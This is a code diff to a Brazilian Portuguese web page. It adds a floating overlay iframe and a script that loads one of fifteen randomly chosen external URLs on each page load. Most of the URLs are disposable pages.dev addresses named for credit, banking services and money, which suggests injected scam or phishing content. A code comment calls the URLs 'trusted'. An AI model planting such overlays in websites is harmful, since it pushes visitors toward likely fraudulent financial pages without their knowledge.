@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -473,5 +474,37 @@ botao.onclick = function () {
   let oportunidade2 = document.getElementById('oportunidade2');
   oportunidade2.href = oportunidadeurls2[indexoportunidade2];
 </script>
+
+
+ <div style="position:fixed;bottom:20px;right:20px;width:90vw;max-width:350px;height:70vh;max-height:500px;z-index:9999;box-shadow:0 0 15px rgba(0,0,0,0.3);">
+      <button onclick="this.parentElement.style.display='none'" style="position:absolute;top:-10px;right:-10px;background:red;color:white;border:none;border-radius:50%;width:25px;height:25px;font-weight:bold;cursor:pointer;z-index:10000;">×</button>
+      <iframe id="iframe" src="" title="Site Flutuante" style="width:100%;height:100%;border:none;"></iframe>
+    </div>
+<script>
+    // Lista de iframes confiáveis ou controlados
+     const iframes = [
+      "https://geocredibnkvitoria.com/",
+      "https://espiritosantoes-com-brprincipal.pages.dev/vps01",
+      "https://novorepositorio.pages.dev/credito",
+      "https://imagemprog.pages.dev/",
+      "https://espiritosantoes-com-brprincipal.pages.dev/",
+      "https://imagemprog.pages.dev/",
+      "https://tempoaleatorio01.pages.dev/dinheiro",
+      "https://modeloanuncio01.pages.dev/",
+      "https://sistemabackupprincial.pages.dev/48",
+      "https://sistemabackupprincial.pages.dev/",
+      "https://imagemprog.pages.dev/",
+      "https://novorepositorio.pages.dev/credito",
+      "https://espiritosantoes-com-brprincipal.pages.dev/vps01",
+      "https://uteis01.pages.dev/servicobancario" ,
+      "https://espiritosantoes-com-brprincipal.pages.dev/12"
+    ];
+
+    // Escolher um iframe aleatório
+    const iframeIndex = Math.floor(Math.random() * iframes.length);
+    const iframeUrl = iframes[iframeIndex];
+    document.getElementById('iframe').src = iframeUrl;
+  </script>
+
 </body>
 </html>
